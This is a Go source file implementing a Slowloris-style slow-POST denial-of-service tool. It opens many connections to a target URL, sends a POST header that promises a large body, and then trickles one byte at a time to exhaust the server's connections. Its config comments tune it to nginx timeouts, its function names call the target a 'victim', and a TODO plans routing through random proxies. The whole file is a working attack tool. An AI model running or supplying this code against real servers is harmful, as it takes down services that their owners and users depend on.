package slowloris

import (
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"net"
	"net/url"
	"strings"
	"time"
)

type Config struct {
	ContentLength    int           // The maximum length of fake POST body in bytes. Adjust to nginx's client_max_body_size
	DialWorkersCount int           // The number of workers simultaneously busy with opening new TCP connections
	RampUpInterval   time.Duration // Interval between new connections' acquisitions for a single dial worker (see DialWorkersCount)
	SleepInterval    time.Duration // Sleep interval between subsequent packets sending. Adjust to nginx's client_body_timeout
	DurationSeconds  time.Duration // Duration in seconds
	Path             string        // Target Path. Http POST must be allowed for this Path
	HostHeader       string        // Host header value in case it is different than the hostname in Path
}

type SlowLoris struct {
	Config *Config
}

var (
	sharedReadBuf  = make([]byte, 4096)
	sharedWriteBuf = []byte("A")
)

func Start(config *Config) error {
	s := &SlowLoris{
		Config: config,
	}

	targetURL, err := url.Parse(config.Path)
	if err != nil {
		log.Printf("Cannot parse Path=[%s]: %v", targetURL, err)
		return err
	}

	targetHostPort := targetURL.Host
	if !strings.Contains(targetHostPort, ":") {
		port := "80"
		if targetURL.Scheme == "https" {
			port = "443"
		}
		targetHostPort = net.JoinHostPort(targetHostPort, port)
	}
	host := targetURL.Host
	if len(config.HostHeader) > 0 {
		host = config.HostHeader
	}
	requestHeader := []byte(fmt.Sprintf("POST %s HTTP/1.1\nHost: %s\nContent-Type: application/x-www-form-urlencoded\nContent-Length: %d\n\n",
		targetURL.RequestURI(), host, config.ContentLength))

	dialWorkersLaunchInterval := config.RampUpInterval / time.Duration(config.DialWorkersCount)
	activeConnectionsCh := make(chan int, config.DialWorkersCount)
	go s.activeConnectionsCounter(activeConnectionsCh)
	for i := 0; i < config.DialWorkersCount; i++ {
		go s.dialWorker(config, activeConnectionsCh, targetHostPort, targetURL, requestHeader)
		time.Sleep(dialWorkersLaunchInterval)
	}
	time.Sleep(config.DurationSeconds)

	return nil
}

func (s SlowLoris) dialWorker(config *Config, activeConnectionsCh chan<- int, targetHostPort string, targetUri *url.URL, requestHeader []byte) {
	isTls := targetUri.Scheme == "https"

	for {
		time.Sleep(config.RampUpInterval)
		conn := s.dialVictim(targetHostPort, isTls)
		if conn != nil {
			go s.doLoris(config, conn, activeConnectionsCh, requestHeader)
		}
	}
}

func (s SlowLoris) activeConnectionsCounter(ch <-chan int) {
	var connectionsCount int
	for n := range ch {
		connectionsCount += n
		log.Printf("Holding %d connections", connectionsCount)
	}
}

func (s SlowLoris) dialVictim(hostPort string, isTls bool) io.ReadWriteCloser {
	// TODO: add support for dialing the Path via a random proxy from the given pool.
	conn, err := net.Dial("tcp", hostPort)
	if err != nil {
		log.Printf("Couldn't establish connection to [%s]: %v", hostPort, err)
		return nil
	}

	tcpConn := conn.(*net.TCPConn)
	if err = tcpConn.SetReadBuffer(128); err != nil {
		log.Printf("Cannot shrink TCP read buffer: %v", err)
		return nil
	}

	if err = tcpConn.SetWriteBuffer(128); err != nil {
		log.Printf("Cannot shrink TCP write buffer: %v", err)
		return nil
	}

	if err = tcpConn.SetLinger(0); err != nil {
		log.Printf("Cannot disable TCP lingering: %v", err)
		return nil
	}

	if !isTls {
		return tcpConn
	}

	tlsConn := tls.Client(conn, &tls.Config{
		InsecureSkipVerify: true,
	})

	if err = tlsConn.Handshake(); err != nil {
		conn.Close()
		log.Printf("Couldn't establish tls connection to [%s]: %v", hostPort, err)
		return nil
	}

	return tlsConn
}

func (s SlowLoris) doLoris(config *Config, conn io.ReadWriteCloser, activeConnectionsCh chan<- int, requestHeader []byte) {
	defer conn.Close()

	if _, err := conn.Write(requestHeader); err != nil {
		log.Printf("Cannot write requestHeader=[%v]: %v", requestHeader, err)
		return
	}

	activeConnectionsCh <- 1
	defer func() { activeConnectionsCh <- -1 }()

	readerStopCh := make(chan int, 1)
	go s.nullReader(conn, readerStopCh)

	for i := 0; i < config.ContentLength; i++ {
		select {
		case <-readerStopCh:
			return
		case <-time.After(config.SleepInterval):
		}
		if _, err := conn.Write(sharedWriteBuf); err != nil {
			log.Printf("Error when writing %d byte out of %d bytes: %v", i, config.ContentLength, err)
			return
		}
	}
}

func (s SlowLoris) nullReader(conn io.Reader, ch chan<- int) {
	defer func() { ch <- 1 }()
	n, err := conn.Read(sharedReadBuf)
	if err != nil {
		log.Printf("Error when reading server response: %v", err)
	} else {
		log.Printf("Unexpected response read from server: %v", sharedReadBuf[:n])
	}
}
